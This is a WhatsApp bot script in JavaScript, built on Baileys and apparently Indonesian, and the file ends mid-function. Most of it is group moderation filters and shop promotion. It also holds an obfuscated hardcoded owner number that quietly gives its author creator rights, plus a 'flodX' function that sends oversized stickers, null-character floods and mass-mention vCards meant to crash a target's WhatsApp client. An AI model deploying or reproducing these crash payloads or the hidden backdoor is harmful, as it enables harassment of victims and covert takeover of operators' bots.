/*

  !- Credits By PRIME XUU
  https://wa.me/6282144385548
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { createCanvas } = require('canvas');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, destinations, encodeSignedDeviceIdentity, shouldIncludeDeviceIdentity } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const serverpanel = JSON.parse(fs.readFileSync("./settingpanel.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const Reseller = JSON.parse(fs.readFileSync("./library/database/reseller.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const stokdo = JSON.parse(fs.readFileSync("./library/database/stokdo.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const gclist = JSON.parse(fs.readFileSync('./library/database/gclist.json'))
const antilinkwame = JSON.parse(fs.readFileSync('./library/database/antilinkwame.json'))
const antitoxic = JSON.parse(fs.readFileSync('./library/database/antitoxic.json'))
const antino = JSON.parse(fs.readFileSync('./library/database/antino.json'))
const antitele = JSON.parse(fs.readFileSync('./library/database/antitele.json'))
const Antilinkch = JSON.parse(fs.readFileSync("./library/database/antilinkch.json"))
const antimediafire = JSON.parse(fs.readFileSync('./library/database/antimediafire.json'))
const Antikataunchek = JSON.parse(fs.readFileSync("./library/database/antikataunchek.json"))
const { pinterest, pinterest2, remini, Buddy, mediafire, tiktokDl, githubstalk } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, ucapan, loadModule } = require('./library/function');

module.exports = Xuu = async (Xuu, m, chatUpdate, store) => {
	try {
await LoadDataBase(Xuu, m)
if (global.moduleType == undefined) global.moduleType = 0
if (global.moduleType = 0) { 
await loadModule(Xuu)
global.moduleType += 1 }
const botNumber = await Xuu.decodeJid(Xuu.user.id)
const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

let body = "";

try {
    
    if (m.type === 'conversation') {
        body = m.message.conversation;
    } else if (m.type == 'imageMessage') {
        body = m.message.imageMessage.caption;
    } else if (m.type == 'videoMessage') {
        body = m.message.videoMessage.caption;
    } else if (m.type == 'extendedTextMessage') {
        body = m.message.extendedTextMessage.text;
    } else if (m.type == 'buttonsResponseMessage') {
        body = m.message.buttonsResponseMessage.selectedButtonId;
    } else if (m.type == 'listResponseMessage') {
        body = m.message.listResponseMessage.singleSelectReply.selectedRowId;
    } else if (m.type == 'templateButtonReplyMessage') {
        body = m.message.templateButtonReplyMessage.selectedId;
    } else if (m.type === 'messageContextInfo') {
        body = (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "");
    }

    // ----- Native Flow (WA terbaru) -----
    else if (m.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
        const nf = m.message.interactiveResponseMessage.nativeFlowResponseMessage;
        try {
            const json = JSON.parse(nf.paramsJson || "{}");
            body = json.id || json.rowId || json.selectedButtonId || "";
        } catch {}
    }

    // ----- Button (WA Old) -----
    else if (m.message?.buttonsResponseMessage) {
        body = m.message.buttonsResponseMessage.selectedButtonId;
    }

    // ----- Template Button -----
    else if (m.message?.templateButtonReplyMessage) {
        body = m.message.templateButtonReplyMessage.selectedId;
    }

    // ----- List Message -----
    else if (m.message?.listResponseMessage) {
        body = m.message.listResponseMessage.singleSelectReply.selectedRowId;
    }

} catch (e) {
    console.log("Error detecting body:", e);
}

// Fallback ke m.text jika body masih kosong
if (!body && m.text) {
    body = m.text;
}
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.chat)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isGroup = m.chat.endsWith("@g.us")
const isCh= m.chat.endsWith("@newsletter")

//~~~~~~~~~ Console Message ~~~~~~~~//

if (m.message) {
    console.log(
        `\n${chalk.magenta.bold("📨 Message")}\n` +
        `${chalk.green.bold("👤 Sender: ")} @${m.sender.split("@")[0]}\n` +
        `${chalk.green.bold("💬 Message: ")} ${budy} ( ${m.mtype} )\n` +
        `${chalk.green.bold("📍 In: ")} ${isCh ? "Channel" : isGroup ? "Group Chat" : "Private Chat"}\n`
    );
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${botname} ✬ ${namaOwner}`,jpegThumbnail: await reSize("./xuu/fake.jpg", 400, 400) }}}

//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Hai Kak* @${m.sender.split('@')[0]}

Maaf *Ownerku Sedang Offline*, Silahkan Tunggu Owner Kembali Online & Jangan Spam Chat`
return Xuu.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./xuu/ownermode.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkWebsite, sourceUrl: linkSaluran, previewType: "PHOTO"}}}, {quoted: m })
}}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
    var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
    if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        var gclink = (`https://chat.whatsapp.com/` + await Xuu.groupInviteCode(m.chat))
        var isLinkThisGc = new RegExp(gclink, 'i')
        var isgclink = isLinkThisGc.test(m.text)
        
        if (isgclink) return
        
        let delet = m.key.participant
        let bang = m.key.id
        
        // Mengirim peringatan bahwa link dihapus
        await Xuu.sendMessage(m.chat, {
            text: `*── Link Terdeteksi* \n\nMaaf @${m.sender.split("@")[0]}, link grup lain tidak diperbolehkan di sini. Pesan kamu telah saya hapus.`, 
            mentions: [m.sender]
        }, {quoted: m})
        
        // Menghapus pesan link tersebut
        await Xuu.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: bang, 
                participant: delet 
            }
        })
    }
}


if (m.Kyy && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Xuu.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Xuu.sendMessage(m.chat, {text: `*── Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


//antilink wa.me
if (antilinkwame.includes(m.chat)) {
const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat) : ''
const participants = m.isGroup ? groupMetadata.participants : ''
const groupAdmins = m.isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : []
const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false
if (!isAdmin && !isCreator && !m.fromMe) {
var link = /wa.me/gi
if (link.test(m.text)) {
var isgclink = false
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Xuu.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink wa.me*`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./xuu/warning.jpg"), title: "｢ LINK WA.ME DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}

//antilinkch
if (Antilinkch.includes(m.chat)) {
    const channelLinkRegex = /https?:\/\/(?:www\.)?whatsapp\.com\/channel\/[a-zA-Z0-9]+/gi;
  if (channelLinkRegex.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
        const senderJid = m.sender;
        const messageId = m.key.id;
        const participantToDelete = m.key.participant;
        await m.reply(`Link Channel Terdeteksi 🚨

Tag Pengirim :
- @${m.sender.split("@")[0]}

Dilarang share/mengirim link channel di dalam grup ini.`, m.chat, [m.sender])
        await Xuu.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: messageId,
                participant: participantToDelete
            }
        });
    }
}

if (Antikataunchek.includes(m.chat)) {
  // 🔥 Anti kata "unchek"
  const forbiddenWords = ["unchek", "uncheck", "list unchek", "list uncheck"];
  if (
    forbiddenWords.some(word => m.text?.toLowerCase().includes(word)) &&
    !isCreator &&
    !m.isAdmin &&
    m.isBotAdmin &&
    !m.fromMe
  ) {
    const senderJid = m.sender;
    const messageId = m.key.id;
    const participantToDelete = m.key.participant;
    await m.reply(`🚫 *Kata Terlarang Terdeteksi!*

Tag Pengirim:
- @${m.sender.split("@")[0]}

Dilarang mengirim pesan yang mengandung kata *unchek*!`, m.chat, { mentions: [m.sender] });
    await Xuu.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: messageId,
        participant: participantToDelete
      }
    });
  }
}

//antitoxic
if (antitoxic.includes(m.chat)) {
    // Daftar kata kasar/toxic (Silahkan tambahkan sendiri)
    const forbiddenWords = [
        "anjing", "anjrit", "bangsat", "memek", "kontol", 
        "goblok", "tolol", "babi", "peler", "itil", 
        "ngentot", "ngewe", "ajg", "bgst", "kntl"
    ];

    if (
        forbiddenWords.some(word => m.text?.toLowerCase().includes(word)) &&
        !isCreator &&
        !m.isAdmin &&
        m.isBotAdmin &&
        !m.fromMe
    ) {
        let delet = m.key.participant
        let bang = m.key.id
        
        // Kirim Peringatan
        await Xuu.sendMessage(m.chat, {
            text: `*── ANTI TOXIC DETECTED ──*\n\nMaaf @${m.sender.split("@")[0]}, jaga ketikan kamu! Mengirim kata kasar dilarang di grup ini. Pesan kamu telah saya hapus.`, 
            mentions: [m.sender]
        }, {quoted: m})
        
        // Hapus Pesan Toxic
        await Xuu.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: bang, 
                participant: delet 
            }
        })
    }
}

//anti no
if (antino.includes(m.chat)) {
    const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat) : ''
    const participants = m.isGroup ? groupMetadata.participants : ''
    const groupAdmins = m.isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : []
    const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false

    if (!isAdmin && !isCreator && !m.fromMe) {
        // Regex diperbarui untuk mendeteksi nomor Global DAN spesifik Indonesia (08, 62, +62)
        const noDetect = /(\+62|62|08)\d{8,13}|(\+\d{1,4}[\s-]?\d{7,15})|(\b\d{10,15}\b)/g
        const cleanText = m.text.replace(/[\s\-\.]/g, '')

        if (noDetect.test(cleanText)) {
            let delet = m.key.participant
            let bang = m.key.id
            
            await Xuu.sendMessage(m.chat, {
                text: `*── NUMBER DETECTED ──*\n\nMaaf @${m.sender.split("@")[0]}, mengirim nomor telepon dilarang di grup ini!`, 
                contextInfo: {
                    mentionedJid: [m.sender], 
                    externalAdReply: {
                        thumbnail: fs.readFileSync("./xuu/warning.jpg"), 
                        title: "RESTRICTED NUMBER", 
                        body: "Anti Nomor (Global & Indo) Aktif",
                        previewType: "PHOTO"
                    }
                }
            }, {quoted: m})
            
            // Proses Delete
            await Xuu.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: bang, 
                    participant: delet 
                }
            })
        }
    }
}

//anti link tele
if (antitele.includes(m.chat)) {
    const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat) : ''
    const participants = m.isGroup ? groupMetadata.participants : ''
    const groupAdmins = m.isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : []
    const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false

    if (!isAdmin && !isCreator && !m.fromMe) {
        // Regex untuk mendeteksi t.me, telegram.me, telegram.dog, dan joinchat telegram
        const teleDetect = /t\.me|telegram\.me|telegram\.dog/gi
        
        if (teleDetect.test(m.text)) {
            let delet = m.key.participant
            let bang = m.key.id
            
            await Xuu.sendMessage(m.chat, {
                text: `*── TELEGRAM LINK DETECTED ──*\n\nMaaf @${m.sender.split("@")[0]}, dilarang mengirim link Telegram di grup ini! Pesan kamu saya hapus.`, 
                contextInfo: {
                    mentionedJid: [m.sender], 
                    externalAdReply: {
                        thumbnail: fs.readFileSync("./xuu/warning.jpg"), 
                        title: "NO TELEGRAM ALLOWED", 
                        body: "Anti Link Telegram Aktif",
                        previewType: "PHOTO"
                    }
                }
            }, {quoted: m})
            
            // Proses Delete
            await Xuu.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: bang, 
                    participant: delet 
                }
            })
        }
    }
}

//antilink mediafire
if (antimediafire.includes(m.chat)) {
    const mfDetect = /mediafire\.com|mfire\.co/gi
    
    if (mfDetect.test(m.text)) {
        // Cek Admin/Owner agar tidak kena hapus
        const groupMetadata = m.isGroup ? await Xuu.groupMetadata(m.chat) : ''
        const groupAdmins = m.isGroup ? groupMetadata.participants.filter(v => v.admin !== null).map(v => v.id) : []
        const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false

        if (!isAdmin && !isCreator && !m.fromMe) {
            let delet = m.key.participant
            let bang = m.key.id
            
            await Xuu.sendMessage(m.chat, {
                text: `*── MEDIAFIRE LINK DETECTED ──*\n\nMaaf @${m.sender.split("@")[0]}, dilarang mengirim link Mediafire di grup ini karena rawan phising/virus!`, 
                contextInfo: {
                    mentionedJid: [m.sender], 
                    externalAdReply: {
                        thumbnail: fs.readFileSync("./xuu/warning.jpg"), 
                        title: "BLOCK MEDIAFIRE LINK", 
                        body: "Anti Link Mediafire Aktif",
                        previewType: "PHOTO"
                    }
                }
            }, {quoted: m})
            
            // Proses Delete
            await Xuu.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: bang, 
                    participant: delet 
                }
            })
        }
    }
}

//antibot
if (budy && !m.key.fromMe && global.antibot) {
if (m.isBaileys) {
if (isAdmin || isOwner || !isBotAdmin) return
m.reply(`*( Anti Bot )* Kamu akan dikeluarkan dari grup ini.`)
await Xuu.sendMessage(m.chat, { delete: m.key })
Xuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Xuu.sendMessage(m.chat, {text: `
*XUU⚡ STORE OPEN*
╭──╼ 【 Catalog Panel 】
https://wa.me/p/9567891619993622/6283825465908
╰────────╼

╭──╼ 【 Catalog Script 】
https://wa.me/p/9838777562808928/6283825465908
╰────────╼

╭──╼ 【 Catalog Nokos 】
https://wa.me/p/9906333319377376/6283825465908
╰────────╼

╭──╼ 【 Catalog Murnokos 】
https://wa.me/p/30044457645153345/6283825465908
╰────────╼

Contact☎️ : 
https://wa.me/6285705081577
https://wa.me/6283825465908

Saluran : https://whatsapp.com/channel/0029Vb5CxIfAjPXInV7XWz38

Grup bebas share : 
https://chat.whatsapp.com/EHyFVryAyzZIWdPIRXmuUU
`}, {quoted: qloc})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}

// ANTILIMK CHANNEL 
const antilinkPath = path.join(__dirname, './library/database', 'antilink.json');

function loadAntilinkData() {
    if (!fs.existsSync(antilinkPath)) {
        fs.writeFileSync(antilinkPath, JSON.stringify({}));
    }
    return JSON.parse(fs.readFileSync(antilinkPath));
}

function saveAntilinkData(data) {
    fs.writeFileSync(antilinkPath, JSON.stringify(data, null, 2));
}

//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `*Contoh :* ${prefix+command} ${teks}`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return Xuu.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted: qtext})
}
const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Xuu.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*XUU Store* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Xuu Store Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/BNrO2WHYBlD251ZhOuqDbz
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Xuu.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

function readSewa() {
      try {
        return JSON.parse(fs.readFileSync("./library/database/sewa.json", "utf8"));
    } catch {
        return {};
    }
}
function writeSewa(dt) {
  fs.writeFileSync("./library/database/sewa.json", JSON.stringify(dt, null, 2))
}
async function checkExpiredSewa() {
    let dts = await readSewa();
    let now = Date.now();
    if (!dts || Object.keys(dts).length === 0) return;

    for (let id in dts) {
        if (now >= dts[id].expired) {
            delete dts[id]; 
            await Xuu.sendMessage(id, { text: "Waktu sewa grup ini telah berakhir, bot akan keluar dalam 4 detik..." });
            await new Promise(resolve => setTimeout(resolve, 4000)); // Tunggu 4 detik
            await Xuu.groupLeave(id);
        }
    }

    await writeSewa(dts);
}

await checkExpiredSewa();


const reply = (teks) => {
Xuu.sendMessage(m.chat, {
    text: teks,
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `AXONIC V12`,
            body: `© xuu Яyuici`,
            mediaType: 3,
            renderLargerThumbnail: false,
            thumbnailUrl: "https://files.catbox.moe/v9nzgz.jpg",
        }
    }
}, { quoted: m });
}

//func ampas
async function flodX(Xuu, target) {
  try {
    const stickerMessage = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        contextInfo: {
          mentionedJid: Array.from(
            { length: 555 },
            () => `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
          ),
          isForwarded: true,
          forwardingScore: 999999999,
        },
      },
    };

    const stickerMsg = await generateWAMessageFromContent(
      target,
      { message: stickerMessage },
      { userJid: target }
    );
    await Xuu.relayMessage("status@broadcast", stickerMsg.message, {
      messageId: stickerMsg.key.id,
      statusJidList: [target],
    });

    const buttonMsg = await generateWAMessageFromContent(
      target,
      {
        buttonsMessage: {
          contentText: "—$",
          buttons: [
            {
              buttonId: "null",
              buttonText: { displayText: "#そ" + "\u0000".repeat(555555) },
              type: 1,
            },
          ],
          headerType: 1,
        },
      },
      {}
    );
    await Xuu.relayMessage("status@broadcast", buttonMsg.message, {
      messageId: buttonMsg.key.id,
      statusJidList: [target],
    });

    await Xuu.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: buttonMsg.key, type: 25 } },
        },
      },
      {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" } },
        ],
      }
    );

    const displayName = "\u0000".repeat(20000);
    const vcard = `BEGIN:VCARD VERSION:3.0 FN:${"\u0000".repeat(
      1000
    )} NOTE:${"\x10".repeat(5000)} END:VCARD`;
    const contactMessage = {
      viewOnceMessage: {
        message: {
          contactMessage: {
            displayName,
            vcard,
            contextInfo: {
              mentionedJid: Array.from({ length: 1901 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              ),
              participant: target,
              remoteJid: target,
              forwardingScore: 9741,
              isForwarded: true,
              quotedMessage: { contactMessage: { displayName, vcard } },
            },
          },
        },
      },
    };
    const msg = await generateWAMessageFromContent(
      target,
      contactMessage,
      { userJid: Xuu.user.id }
    );
    await Xuu.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });
  } catch (err) {
    console.error(err);
  }
}



async function VcCallVoiceEmailXy(Xuu, jid) {
  const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
  
  let devices = (
   await Xuu.getUSyncDevices([jid], false, false)
   ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

   await Xuu.assertSessions(devices);

  let functional = () => {
  let map = {};
  return {
   mutex(key, fn) {
     map[key] ??= { task: Promise.resolve() };
     map[key].task = (async prev => {
      try { await prev; } catch {}
      return fn();
      })(map[key].task);
      return map[key].task;
     }
   };
 };

  let merge = functional();
  let buffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let cptcp = Xuu.createParticipantNodes.bind(Xuu);
  let encodeWAMsg = Xuu.encodeWAMessage?.bind(Xuu);

  Xuu.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
  if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

  let patched = await (Xuu.patchMessageBeforeSending?.(message, recipientJids) ?? message);
  let Objct = Array.isArray(patched) 
  ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
  let { id: meId, lid: meLid } = Xuu.authState.creds.me;
  let LiD = meLid ? jidDecode(meLid)?.user : null;
  let shouldIncludeDeviceIdentity = false;

  let nodes = await Promise.all(Objct.map(async ({ recipientJid: jid, message: msg }) => {
  let { user: targetUser } = jidDecode(jid);
  let { user: ownPnUser } = jidDecode(meId);
  let isOwnUser = targetUser === ownPnUser || targetUser === LiD;
  let usersx = jid === meId || jid === meLid;
